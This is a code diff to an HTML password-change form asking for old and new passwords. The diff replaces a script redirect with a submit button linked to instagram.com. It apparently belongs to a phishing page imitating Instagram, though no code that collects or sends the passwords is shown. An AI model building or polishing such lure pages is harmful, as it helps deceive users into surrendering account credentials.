@@ -126,12 +126,7 @@
 
         a {
             text-decoration: none;
-        }
-
-        button {
-            background: none;
-            border: none;
-            padding: 15px;
+            color: white;
         }
     </style>
 </head>
@@ -156,7 +151,7 @@
             <input type="password" id="oldpassword" placeholder="Old password" required="true" name="Old Password">
             <input type="password" id="newpassword" placeholder="New password" required="true" name="New Password">
             <input type="password" id="newpasswordagain" placeholder="New password, again" required="true">
-            <button id="submit" onclick="thankyou()">Submit</button>
+            <button id="submit"><a href="https://instagram.com">Submit</a></button>
         </form>
     </div>
     <script>
@@ -176,11 +171,6 @@
             }
             else {
                 btn.style.opacity = 0.5;
-            }
-        }
-        function thankyou() {
-            if(oldPassword.value.length >= 6 && newPassword.value.length >= 6 && confNewPassword.value.length > 5){
-                window.location.replace = "https://www.instagram.com";
             }
         }
     </script>
